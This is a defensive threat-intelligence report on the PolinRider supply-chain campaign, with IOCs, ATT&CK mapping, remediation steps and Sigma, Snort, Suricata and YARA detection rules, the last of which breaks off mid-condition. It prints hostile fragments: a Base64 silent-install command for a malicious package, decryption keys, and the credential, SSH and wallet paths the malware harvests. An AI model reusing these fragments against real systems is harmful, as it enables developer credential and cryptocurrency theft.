# Technical Analysis Report: PolinRider Campaign -- North Korean Supply Chain Attack (2026-07-06)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-07-06
Version: 1.0

## Executive Summary

North Korean threat actors operating under the Contagious Interview / Famous Chollima cluster have published 108 unique malicious packages across 162 release artifacts spanning npm, Packagist (Composer), Go modules, and the Chrome Web Store as part of the **PolinRider** campaign. First identified by OpenSourceMalware in March 2026 and subsequently analyzed by Socket Security and JFrog, the campaign uses typosquatted packages, compromised maintainer accounts, and fake recruitment projects to inject obfuscated JavaScript loaders into developer environments. These loaders communicate with blockchain-based dead-drop C2 infrastructure (TRON, Aptos, BNB Smart Chain) and Vercel-hosted HTTP endpoints to deliver second-stage payloads including BeaverTail, DEV#POPPER/InvisibleFerret RAT, and OmniStealer. A related cluster of six Rollup polyfill masquerading packages (discovered by JFrog) uses a distinct C2 at 216.126.236[.]244 with JSONKeeper for staging. As of early July 2026, the campaign has compromised 1,951 public GitHub repositories belonging to 1,047 unique owners and remains actively ongoing.

## Background: Open Source Package Ecosystems

Open source package managers (npm, Packagist, Go modules, Chrome Web Store) form the backbone of modern software development. North Korean state-sponsored actors have systematically targeted these ecosystems since at least 2024, combining fake job interview lures with supply chain poisoning to steal developer credentials, cryptocurrency wallet data, and source code. The PolinRider campaign represents a significant escalation in both scale (108 packages across four ecosystems) and sophistication (blockchain-based C2, account takeover, git history manipulation).

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| March 2026 | OpenSourceMalware first flags PolinRider malicious packages on npm |
| March 2026 (late) | Socket, Checkmarx, and Phylum independently flag unusual publication patterns |
| April 2026 | Campaign scale reaches 1,700+ malicious packages across npm, PyPI, Go, Rust, PHP (broader NK effort) |
| April 11, 2026 | Socket confirms 1,951 compromised GitHub repos, 1,047 unique owners |
| June 23, 2026 | Synchronized modifications across Xpos587 account repositories (~10:00 UTC) indicate account takeover |
| July 2, 2026 | JFrog publishes analysis of Rollup polyfill masquerading npm packages |
| July 3, 2026 | THN reports on NK npm packages mimicking Rollup polyfill tools |
| July 4, 2026 | Socket/THN publish expanded PolinRider analysis covering 108 packages across 4 ecosystems |
| July 2026 (ongoing) | Campaign remains active with new packages continuing to appear |

## Root Cause: Supply Chain Compromise via Multiple Vectors

The PolinRider campaign employs four primary infection vectors:

1. **Typosquatted packages**: Malicious npm packages mimicking popular libraries (e.g., `tailwindcss-style-animate` impersonating `tailwindcss-animate`, `rollup-packages-polyfill-core` impersonating `rollup-plugin-polyfill-node`)
2. **Account takeover**: Compromised legitimate maintainer accounts used to push malicious updates to trusted repositories (evidenced by synchronized modifications across repos)
3. **Fake recruitment projects**: "ShoeVista" and "StakingGame" interview templates bundling malicious dependencies
4. **VS Code task injection**: Malicious `.vscode/tasks.json` files with `runOn: folderOpen` executing payloads upon workspace opening

## Technical Analysis of the Malicious Payload

### 1. Initial Loader -- Config File Injection and Package Poisoning

**npm packages** use postinstall hooks to inject obfuscated JavaScript after `export default` / `module.exports` statements in configuration files. Targeted config files include:
- `postcss.config.mjs` (~960 instances)
- `tailwind.config.js` (~210 instances)
- `eslint.config.mjs` (~150 instances)
- `next.config.mjs` (~30 instances)
- `vite.config.*` (~20 instances)
- `babel.config.js`, `app.js`, `config.js`

**Rollup masquerading packages** hide a Base64-encoded npm install command behind benign-looking SVG validation function names, using `spawn()` with `stdio: 'ignore'` and `windowsHide: true`:
- `rollup-packages-polyfill-core` silently installs `swift-parse-stream`
- `rollup-runtime-polyfill-core` silently installs `quirky-token`

Base64-encoded install command: `bnBtIGluc3RhbGwgc3dpZnQtcGFyc2Utc3RyZWFtIC0tbm8tc2F2ZSAtLXNpbGVudCAtLW5vLWF1ZGl0IC0tbm8tZnVuZA==` (decodes to: `npm install swift-parse-stream --no-save --silent --no-audit --no-fund`)

**Obfuscation**: Two obfuscator variants identified:
- **Original (rmcej%otb%)**: Seed `2857687`, decoder function `_$_1e42`, global marker `global['!']`
- **New (Cot%3t=shtP)**: Seed `1111436`, decoder function `MDy`, global marker `global['_V']='8-stN'`

Additional concealment techniques include whitespace padding beyond default screen width, fake `.woff2` font files containing executable JavaScript, and VS Code task files executing .woff2 payloads via Node.js.

### 2. Payload Decryption and Staging

The second-stage packages fetch JSON objects from JSONKeeper (`jsonkeeper[.]com/b/3P9BF`) and execute the `model` field via `eval()`.

The packed payload (~114 KB decrypted) derives its AES-256-CBC key via:
```
crypto.scryptSync("98cb54c0b4ac259d30c9c1ca1ae87c68", "salt", 32)
```

Decrypted payload is written to `<tmp>/pack`. Additional dropped scripts:
- `<tmp>/scdata` -- remote access and host control
- `<tmp>/ldata` -- browser and cryptocurrency wallet data collection
- Process marker: `vhost.ctl` in temporary `.npm` directory

**XOR decryption keys** for blockchain-retrieved payloads:
- Primary: `2[gWfGj;<:-93Z^C`
- Secondary: `m6:tTh^D)cBz?NM]`

**Sandbox evasion**: The payload exits if any of these environment variables are detected: `CODESPACE_NAME`, `CODESANDBOX_HOST`, `VERCEL`, `AWS_EXECUTION_ENV`, `AWS_REGION`, `AWS_LAMBDA_FUNCTION_NAME`, `AWS_ACCESS_KEY_ID`, `GOOGLE_CLOUD_PROJECT`, `AZURE_FUNCTIONS_ENVIRONMENT`, `DOCKER`, `RENDER`, `GAE_ENV`, `WEBSITE_SITE_NAME`, `DYNO`, `SOCKET_DEV`

### 3. C2 Infrastructure

**Blockchain dead-drop C2** (PolinRider core):
- TRON addresses: `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`, `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`
- Aptos: `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e`, `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3`
- BSC RPC endpoints: `bsc-dataseed[.]binance[.]org`, `bsc-rpc[.]publicnode[.]com`

**Vercel-hosted HTTP C2** subdomains:
- `260120[.]vercel[.]app` (56 references)
- `default-configuration[.]vercel[.]app` (106 references)
- `vscode-settings-bootstrap[.]vercel[.]app` (16 references)
- `vscode-settings-config[.]vercel[.]app` (11 references)
- `vscode-bootstrapper[.]vercel[.]app` (6 references)
- `vscode-load-config[.]vercel[.]app` (6 references)

**Direct C2 IP** (Rollup masquerading cluster):
- `216.126.236[.]244` with multiple service ports:
  - `/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68` -- payload delivery
  - `/api/service/makelog` -- clipboard/keystroke exfiltration
  - Port 4801 -- Socket.IO remote access
  - Port 4806 `/upload` -- file collection
  - Port 4809 `/upload` -- browser/wallet data exfiltration
  - Port 4809 `/cldbs` -- cloud database exfiltration

**Staging**: JSONKeeper at `jsonkeeper[.]com/b/3P9BF`

**Communication library**: `socket.io-client` for real-time bidirectional C2

### 4. Platform-Specific Behavior

#### macOS
- Clipboard monitoring via `pbpaste`
- Keychain theft: `~/Library/Keychains/login.keychain-db`
- Browser profile targeting: Chrome, Brave, Edge, Opera

#### Windows
- Clipboard monitoring via `powershell Get-Clipboard`
- Input device control via `@nut-tree-fork/nut-js`
- Git history manipulation via `temp_auto_push.bat` batch scripts
- Process spawning with `windowsHide: true`
- Browser profile targeting: Chrome, Edge, Brave, Opera, LT Browser

#### Linux / Cross-platform
- Shell history theft: `~/.bash_history`, `~/.zsh_history`
- SSH key theft from `~/.ssh/`
- Developer tool config theft from `.aws`, `.azure`, `.gnupg`, `.config`, `.foundry`
- AI/IDE editor history from `.vscode`, `.cursor`, `.windsurf`, `.gemini`, `.claude` directories
- Editor history paths: `Code/User/History`, `Windsurf/User/History`, `Cursor/User/History`

### 5. Anti-Forensics / Evasion Techniques

- **Environment fingerprinting**: Checks 15+ environment variables to detect cloud/sandbox/analysis environments
- **Git history rewriting**: `temp_auto_push.bat` scripts rewrite commit history to mask attacker modifications and ante-date commits
- **Force pushes**: Overwrite repository history to erase evidence of compromise
- **Maintainer impersonation**: Commits appear authored by original legitimate maintainers
- **Benign naming**: Malicious functions named after SVG validation routines
- **Whitespace concealment**: Payloads padded with whitespace beyond default editor viewport
- **Font file disguise**: Malicious JavaScript hidden in `.woff2` font files

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`, `c2[.]attacker[.]net`)
> - IP addresses: `[.]` replacing dots (e.g., `216.126.236[.]244`)

### Package / Software Level

| Package / Component | Ecosystem | Description |
|---------------------|-----------|-------------|
| tailwindcss-style-animate | npm | Typosquat of tailwindcss-animate; primary ShoeVista vector (34 victims) |
| tailwind-mainanimation | npm | Typosquat (publisher: allavin, deleted) |
| tailwind-autoanimation | npm | Typosquat (publisher: blackedward, deleted) |
| tailwind-animationbased | npm | Typosquat variant |
| tailwindcss-typography-style | npm | Typosquat (6 victims) |
| tailwindcss-style-modify | npm | Typosquat (4 victims) |
| tailwindcss-animate-style | npm | Typosquat variant |
| rollup-packages-polyfill-core | npm | Masquerades as rollup-plugin-polyfill-node; installs swift-parse-stream |
| rollup-runtime-polyfill-core | npm | Masquerades as rollup-plugin-polyfill-node; installs quirky-token |
| swift-parse-stream | npm | Hidden dependency installed by rollup-packages-polyfill-core |
| quirky-token | npm | Hidden dependency installed by rollup-runtime-polyfill-core |
| rollup-plugin-polyfill-connect | npm | Malicious Rollup polyfill impersonator |
| react-icon-svgs | npm | Malicious package |
| sevenspan/* (10 packages) | Packagist | Compromised namespace with 10 malicious packages |
| 61 Go modules | Go | Various compromised modules |
| 1 Chrome extension | Chrome Web Store | Malicious browser extension |

### File System

| Platform | Path / Artifact | Description |
|----------|-----------------|-------------|
| Cross-platform | `<tmp>/pack` | Decrypted second-stage payload (~114 KB) |
| Cross-platform | `<tmp>/scdata` | Remote access/host control script |
| Cross-platform | `<tmp>/ldata` | Browser/wallet data collection script |
| Cross-platform | `<tmp>/.npm/vhost.ctl` | Process marker file |
| Windows | `temp_auto_push.bat` | Git history manipulation batch script |
| Cross-platform | `.vscode/tasks.json` | Malicious VS Code task file with `runOn: folderOpen` |
| Cross-platform | `public/fonts/fa-solid-400.woff2` | Fake font file containing malicious JavaScript |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | `216.126.236[.]244` | Primary C2 for Rollup masquerading cluster |
| Domain | `260120[.]vercel[.]app` | Vercel-hosted C2 (56 refs) |
| Domain | `default-configuration[.]vercel[.]app` | Vercel-hosted C2 (106 refs) |
| Domain | `vscode-settings-bootstrap[.]vercel[.]app` | Vercel-hosted C2 (16 refs) |
| Domain | `vscode-settings-config[.]vercel[.]app` | Vercel-hosted C2 (11 refs) |
| Domain | `vscode-bootstrapper[.]vercel[.]app` | Vercel-hosted C2 (6 refs) |
| Domain | `vscode-load-config[.]vercel[.]app` | Vercel-hosted C2 (6 refs) |
| Domain | `jsonkeeper[.]com` | Payload staging (path: /b/3P9BF) |
| Domain | `bsc-dataseed[.]binance[.]org` | BSC RPC endpoint for dead-drop C2 |
| Domain | `bsc-rpc[.]publicnode[.]com` | BSC RPC endpoint for dead-drop C2 |
| URL Pattern | `hxxp://216.126.236[.]244/api/service/*` | C2 API endpoints |
| URL Pattern | `hxxp://216.126.236[.]244:4801` | Socket.IO remote access |
| URL Pattern | `hxxp://216.126.236[.]244:4806/upload` | File exfiltration |
| URL Pattern | `hxxp://216.126.236[.]244:4809/upload` | Browser/wallet data exfiltration |
| URL Pattern | `hxxp://216.126.236[.]244:4809/cldbs` | Cloud DB exfiltration |
| TRON Address | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | Blockchain dead-drop C2 |
| TRON Address | `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | Blockchain dead-drop C2 |
| Aptos Address | `0xbe03740...380811e` | Blockchain dead-drop C2 |
| Aptos Address | `0x3f0e578...d5dce3` | Blockchain dead-drop C2 |

### Behavioral

- **Obfuscator markers in config files**: `rmcej%otb%` (original), `Cot%3t=shtP` (new variant)
- **Decoder functions**: `_$_1e42` (original), `function MDy(f)` (new variant)
- **Global markers**: `global['!']` (original), `global['_V']='8-stN'` (new variant)
- **XOR keys**: `2[gWfGj;<:-93Z^C` (primary), `m6:tTh^D)cBz?NM]` (secondary)
- **AES key derivation**: `crypto.scryptSync("98cb54c0b4ac259d30c9c1ca1ae87c68", "salt", 32)`
- **Dependencies installed at runtime**: `socket.io-client`, `ssh2`, `node-pty@1.0.0`, `screenshot-desktop`, `sharp`, `clipboardy`, `@nut-tree-fork/nut-js`
- **File extensions searched**: `*.env*, *.pem, *.key, *.secret, *.json, *.txt, *.csv, *.doc, *.docx, *.xls, *.xlsx, *.pdf, *.png, *.jpg, *.jpeg, *.md, *.rtf, *.odt, *.ini, *.ts, *.js`
- **Cryptocurrency wallet extensions targeted**: MetaMask (`nkbihfbeogaeaoehlefnkodbefgpgknn`) and others via `Local Extension Settings/<extension-id>/*`
- **Clipboard monitoring**: `pbpaste` (macOS), `powershell Get-Clipboard` (Windows), exfiltrated to `/api/service/makelog`

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | 108 malicious packages across npm, Packagist, Go, Chrome Web Store |
| T1199 | Trusted Relationship | Account takeover of legitimate package maintainers |
| T1204.002 | User Execution: Malicious File | Developers install/build projects containing malicious dependencies |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Obfuscated JavaScript loaders in config files and fake font files |
| T1027 | Obfuscated Files or Information | XOR encryption, whitespace padding, base64 encoding, custom obfuscator |
| T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | XOR-encrypted payloads retrieved from blockchain dead drops |
| T1036.008 | Masquerading: Masquerade File Type | Malicious JavaScript hidden in .woff2 font files |
| T1102 | Web Service | Blockchain RPC endpoints (TRON, Aptos, BSC) as dead-drop C2 |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP-based C2 via Vercel subdomains and direct IP |
| T1041 | Exfiltration Over C2 Channel | File/credential/wallet data uploaded to C2 IP on multiple ports |
| T1555 | Credentials from Password Stores | Browser credential databases (Login Data, Web Data) targeted |
| T1539 | Steal Web Session Cookie | Browser profile and cookie theft |
| T1005 | Data from Local System | AWS/Azure/SSH/GPG keys, shell history, editor history, Keychain |
| T1113 | Screen Capture | screenshot-desktop dependency for screen capture |
| T1115 | Clipboard Data | Clipboard monitoring via pbpaste/Get-Clipboard |
| T1056 | Input Capture | @nut-tree-fork/nut-js for desktop automation input control (Windows) |
| T1070 | Indicator Removal | Git history rewriting and force-push via temp_auto_push.bat |

## Impact Assessment

- **Scale**: 108 unique malicious packages, 162 release artifacts, 1,951 compromised GitHub repositories, 1,047 unique owners
- **Growth rate**: 675 to 1,951 compromised repos in 5 weeks (2.9x increase)
- **Ecosystems affected**: npm (19 packages), Packagist (10 packages), Go (61 modules), Chrome Web Store (1 extension)
- **Data at risk**: Developer credentials (AWS, Azure, GCP, SSH, GPG), AI tool configs (Claude, Gemini, Foundry), browser credentials, cryptocurrency wallets, source code, shell history
- **Malware deployed**: BeaverTail (loader), DEV#POPPER/InvisibleFerret (RAT), OmniStealer (stealer)

## Detection & Remediation

### Immediate Detection

```bash
# Check for known malicious npm packages in project
grep -rE "tailwindcss-style-animate|tailwind-mainanimation|tailwind-autoanimation|tailwind-animationbased|tailwindcss-typography-style|tailwindcss-style-modify|tailwindcss-animate-style|rollup-packages-polyfill-core|rollup-runtime-polyfill-core|swift-parse-stream|quirky-token|rollup-plugin-polyfill-connect|react-icon-svgs" package.json package-lock.json yarn.lock 2>/dev/null

# Check for obfuscator markers in config files
grep -rE "rmcej%otb%|Cot%3t=shtP|_\\\$_1e42|function MDy|global\['!'\]|global\['_V'\]" *.config.* .vscode/ 2>/dev/null

# Check for malicious VS Code tasks
grep -rE '"runOn".*"folderOpen"' .vscode/tasks.json 2>/dev/null

# Check for fake font file payloads
file public/fonts/*.woff2 2>/dev/null | grep -v "Web Open Font Format"

# Check for temp_auto_push.bat
find . -name "temp_auto_push.bat" 2>/dev/null

# Check for process markers
ls -la /tmp/.npm/vhost.ctl 2>/dev/null
```

### Remediation

1. **Remove malicious packages**: Uninstall all known malicious packages from projects and lockfiles
2. **Rotate credentials**: Immediately rotate all potentially exposed secrets (AWS, Azure, GCP, SSH keys, npm tokens, GitHub tokens)
3. **Revoke browser sessions**: Clear browser credential stores and revoke active sessions
4. **Check cryptocurrency wallets**: Verify wallet integrity and move assets to new wallets if compromise is suspected
5. **Audit git history**: Check for unauthorized force pushes, ante-dated commits, and unauthorized modifications
6. **Scan for persistence**: Check VS Code tasks, config files, and scheduled tasks for injected code
7. **Network monitoring**: Block the identified C2 infrastructure at the firewall/proxy level

### Long-Term Hardening

- Enable package lockfile integrity checking (`npm audit signatures`)
- Use allowlists for approved packages in CI/CD
- Enable VS Code `security.workspace.trust` to prevent auto-execution of workspace tasks
- Monitor for unexpected network connections from development environments
- Implement egress filtering to block connections to blockchain RPC endpoints from development machines
- Use Socket.dev or similar supply chain security tooling for dependency monitoring

## Detection Rules

These detections target the PolinRider campaign's C2 infrastructure, malicious package artifacts, and execution patterns. PoC/advisory-specific (default altitude); Sigma rules convert cleanly to Splunk and CrowdStrike LogScale. Compiles does not equal fires -- verify in your pipeline with real telemetry.

### Sigma: DNS Query to PolinRider Vercel C2 Subdomain
Detects DNS resolution of known Vercel-hosted C2 subdomains used by the campaign for payload delivery.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check -x attacktag 0 (ATT&CK validator excluded due to proxy-blocked MITRE data fetch — environment issue, not rule issue); splunk convert 0; log_scale convert 0. Domains sourced from OpenSourceMalware/PolinRider GitHub tracker with reference counts (56–106 hits). No benign use expected for these specific subdomains. -->
```yaml
title: DNS Query to PolinRider Vercel C2 Subdomain
id: 4007e702-0415-4c87-8470-b2e5447666dd
status: experimental
description: >
    Detects DNS queries to known Vercel-hosted C2 subdomains used by the
    PolinRider North Korean supply chain campaign for payload delivery and
    command-and-control communication.
references:
    - https://socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands
    - https://github.com/OpenSourceMalware/PolinRider
    - https://thehackernews.com/2026/07/north-korean-hackers-publish-108.html
author: Actioner
date: 2026-07-06
tags:
    - attack.t1071.001
    - attack.t1102
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith:
            - '260120.vercel.app'
            - 'default-configuration.vercel.app'
            - 'vscode-settings-bootstrap.vercel.app'
            - 'vscode-settings-config.vercel.app'
            - 'vscode-bootstrapper.vercel.app'
            - 'vscode-load-config.vercel.app'
    condition: selection
falsepositives:
    - Unlikely - these are known malicious subdomains with no legitimate use
level: high
```

### Sigma: Network Connection to PolinRider C2 IP Address
Detects outbound connections to the confirmed Rollup masquerading cluster C2 server.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check -x attacktag 0; splunk convert 0; log_scale convert 0. IP 216.126.236.244 confirmed by JFrog analysis with multiple service ports (4801, 4806, 4809). Single-IP rule — rotates over time; pair with behavioral detections for durability. -->
```yaml
title: Network Connection to PolinRider C2 IP Address
id: bf2e0607-3cbd-4254-8bf7-bb2051ce693c
status: experimental
description: >
    Detects outbound network connections to the known PolinRider campaign
    C2 server IP address 216.126.236.244 used for payload delivery,
    remote access, and data exfiltration.
references:
    - https://research.jfrog.com/post/rollup-polyfill-masquerading/
    - https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html
author: Actioner
date: 2026-07-06
tags:
    - attack.t1071.001
    - attack.t1041
logsource:
    category: network_connection
detection:
    selection:
        DestinationIp: '216.126.236.244'
    condition: selection
falsepositives:
    - Unlikely - this IP is a confirmed C2 endpoint
level: critical
```

### Sigma: Node.js Execution of Fake WOFF2 Font File
Detects Node.js running a .woff2 file -- a PolinRider technique for disguising JS payloads as fonts.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check -x attacktag 0; splunk convert 0; log_scale convert 0. Legitimate Node.js processing of .woff2 is extremely rare; font files are not JavaScript. The VS Code TaskJacker variant uses this exact pattern. -->
```yaml
title: Node.js Execution of Fake WOFF2 Font File - PolinRider
id: dbdae443-7829-406d-98f3-7cdb5e19ddc4
status: experimental
description: >
    Detects Node.js executing a .woff2 file, a technique used by the PolinRider
    campaign to disguise malicious JavaScript payloads as font files that are
    then executed via VS Code tasks or npm scripts.
references:
    - https://socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands
    - https://github.com/OpenSourceMalware/PolinRider
author: Actioner
date: 2026-07-06
tags:
    - attack.t1059.007
    - attack.t1036.008
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith:
            - '/node'
            - '\node.exe'
        CommandLine|contains: '.woff2'
    condition: selection
falsepositives:
    - Legitimate tooling that processes font files via Node.js (uncommon)
level: high
```

### Sigma: DNS Query to JSONKeeper Staging Domain
Detects DNS queries to jsonkeeper[.]com, used by the campaign for second-stage payload hosting. Scope to developer workstations/CI runners; JSONKeeper has some legitimate (albeit niche) use. This rule is intended for correlation with other PolinRider indicators, not as a standalone alert.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma check -x attacktag 0; splunk convert 0; log_scale convert 0. JSONKeeper is a legitimate service (false positive risk), but queries from developer machines in context of other PolinRider indicators are high-signal. Medium confidence due to benign overlap. -->
<!-- revision: removed attack.t1059.007 tag — DNS query does not observe JS execution; added correlation-only caveat -->
```yaml
title: DNS Query to JSONKeeper - Potential PolinRider Payload Staging
id: 955cb601-f031-4ea4-bdab-a6699c107974
status: experimental
description: >
    Detects DNS queries to jsonkeeper.com which is used by the PolinRider
    campaign to host second-stage JavaScript payloads. This is a
    correlation-only indicator; pair with other PolinRider detections
    before escalating.
references:
    - https://research.jfrog.com/post/rollup-polyfill-masquerading/
    - https://thehackernews.com/2026/07/north-korea-linked-npm-packages-mimic.html
author: Actioner
date: 2026-07-06
tags:
    - attack.t1102
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith: 'jsonkeeper.com'
    condition: selection
falsepositives:
    - Legitimate developer usage of JSONKeeper for JSON storage
level: medium
```

### Snort: PolinRider C2 Connection to Known IP
Detects any TCP connection to the confirmed PolinRider C2 IP address.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -c /etc/snort/snort.conf (via include) -T exit 0. Snort 2.9.20. Direct IP match — minimal FP risk while IP is active. -->
```snort
alert tcp $HOME_NET any -> 216.126.236.244 any (msg:"Actioner - PolinRider C2 Connection to Known Malicious IP 216.126.236.244"; flow:established,to_server; classtype:trojan-activity; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; sid:2100010; rev:1;)
```

### Snort: PolinRider C2 API Service Endpoint
Detects HTTP requests to the PolinRider-specific C2 API path containing the campaign's AES key identifier.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -c /etc/snort/snort.conf (via include) -T exit 0. Snort 2.9.20. URI path + 32-char hex identifier is highly specific. -->
<!-- revision: added http_uri to second content match — without it distance:0 is a no-op across buffer boundaries; rev bumped to 2 -->
```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - PolinRider C2 API Service Endpoint"; flow:established,to_server; content:"/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68"; http_uri; classtype:trojan-activity; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; sid:2100011; rev:2;)
```

### Snort: PolinRider Data Exfiltration Upload
Detects HTTP POST requests to /upload endpoints targeting the known C2 IP, used for credential and wallet exfiltration.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -c /etc/snort/snort.conf (via include) -T exit 0. Snort 2.9.20. Combines POST method, /upload URI, and C2 IP in Host header for high specificity. -->
```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - PolinRider Exfiltration Upload Endpoint"; flow:established,to_server; content:"POST"; http_method; content:"/upload"; http_uri; content:"216.126.236.244"; http_header; classtype:trojan-activity; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; sid:2100012; rev:1;)
```

### Suricata: PolinRider C2 API Service Beacon
Detects HTTP requests to the campaign-specific C2 API path with the embedded AES key material identifier.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T -S exit 0. Suricata 7.0.3. Full URI path match is highly distinctive. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - PolinRider C2 API Service Beacon"; flow:established,to_server; http.uri; content:"/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68"; fast_pattern; classtype:trojan-activity; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; metadata:author Actioner, created_at 2026-07-06; sid:2200010; rev:1;)
```

### Suricata: PolinRider Clipboard Exfiltration to Makelog Endpoint
Detects HTTP requests to the `/api/service/makelog` endpoint used for clipboard data exfiltration.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T -S exit 0. Suricata 7.0.3. URI path is campaign-specific; no benign service uses this exact path. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - PolinRider Clipboard Exfiltration to Makelog Endpoint"; flow:established,to_server; http.uri; content:"/api/service/makelog"; fast_pattern; classtype:trojan-activity; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; metadata:author Actioner, created_at 2026-07-06; sid:2200011; rev:1;)
```

### Suricata: DNS Query to PolinRider Vercel C2 (260120)
Detects DNS queries to the most-referenced PolinRider Vercel C2 subdomain.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T -S exit 0. Suricata 7.0.3. Subdomain is campaign-specific with 56 observed references. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - PolinRider DNS Query to Vercel C2 Domain 260120.vercel.app"; dns.query; content:"260120.vercel.app"; nocase; fast_pattern; classtype:trojan-activity; reference:url,socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands; metadata:author Actioner, created_at 2026-07-06; sid:2200012; rev:1;)
```

### Suricata: DNS Query to PolinRider Vercel C2 (default-configuration)
Detects DNS queries to the highest-referenced PolinRider Vercel C2 subdomain (106 references).
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T -S exit 0. Suricata 7.0.3. Most-used Vercel C2 subdomain; no benign use expected. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - PolinRider DNS Query to Vercel C2 Domain default-configuration.vercel.app"; dns.query; content:"default-configuration.vercel.app"; nocase; fast_pattern; classtype:trojan-activity; reference:url,socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands; metadata:author Actioner, created_at 2026-07-06; sid:2200013; rev:1;)
```

### Suricata: DNS Query to PolinRider Vercel C2 (vscode-settings-bootstrap)
Detects DNS queries to the vscode-settings-bootstrap Vercel C2 subdomain.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T -S exit 0. Suricata 7.0.3. Campaign-specific subdomain. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - PolinRider DNS Query to Vercel C2 Domain vscode-settings-bootstrap.vercel.app"; dns.query; content:"vscode-settings-bootstrap.vercel.app"; nocase; fast_pattern; classtype:trojan-activity; reference:url,socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands; metadata:author Actioner, created_at 2026-07-06; sid:2200014; rev:1;)
```

### Suricata: DNS Query to JSONKeeper Staging Domain
Detects DNS resolution of jsonkeeper[.]com used for payload staging. Medium confidence due to legitimate service overlap.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: suricata -T -S exit 0. Suricata 7.0.3. JSONKeeper has some legitimate use — medium confidence. Best paired with other PolinRider indicators for correlation. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - PolinRider DNS Query to JSONKeeper Staging Domain"; flow:to_server; dns.query; content:"jsonkeeper.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,research.jfrog.com/post/rollup-polyfill-masquerading/; metadata:author Actioner, created_at 2026-07-06; sid:2200015; rev:1;)
```

### YARA: PolinRider Malicious JavaScript Loader
Detects PolinRider loader files via obfuscator markers, XOR decryption keys, and the AES key derivation salt.
**Status:** compile ✅ compiles · confidence: high · sample: fired ✓
<!-- audit: yarac exit 0. yara fired on positive sample containing rmcej%otb% + _$_1e42 markers (source-published strings from OpenSourceMalware/PolinRider); quiet on benign JS. Condition requires 2+ distinctive markers from the campaign's documented obfuscator variants. -->
```yara
rule PolinRider_Malicious_JS_Loader
{
    meta:
        description = "Detects PolinRider campaign JavaScript loaders via obfuscator markers, XOR keys, and distinctive code patterns found in malicious npm/config file injections"
        author = "Actioner"
        date = "2026-07-06"
        reference = "https://socket.dev/blog/polinrider-north-korea-linked-supply-chain-campaign-expands"
        tlp = "WHITE"
        severity = "high"

    strings:
        $xor_key1 = "2[gWfGj;<:-93Z^C" ascii
        $xor_key2 = "m6:tTh^D)cBz?NM]" ascii
        $obf_marker1 = "rmcej%otb%" ascii
        $obf_marker2 = "Cot%3t=shtP" ascii
        $decoder_orig = "_$_1e42" ascii
        $decoder_new = "function MDy(f)" ascii
        $global_orig = "global['!']" ascii
        $global_new = "global['_V']" ascii
        $aes_salt = "98cb54c0b4ac259d30c9c1ca1ae87c68" ascii
        $b64_npm_install = "bnBtIGluc3RhbGwgc3dpZnQtcGFyc2Utc3RyZWFtIC0tbm8tc2F2ZSAtLXNpbGVudCAtLW5vLWF1ZGl0IC0tbm8tZnVuZA==" ascii
        $c2_ip = "216.126.236.244" ascii

    condition:
        filesize < 5MB and
        (2 of ($xor_key*) or
         2 of ($obf_marker*, $decoder_orig, $decoder_new, $global_orig, $global_new) or
         $aes_salt or
         $b64_npm_install or
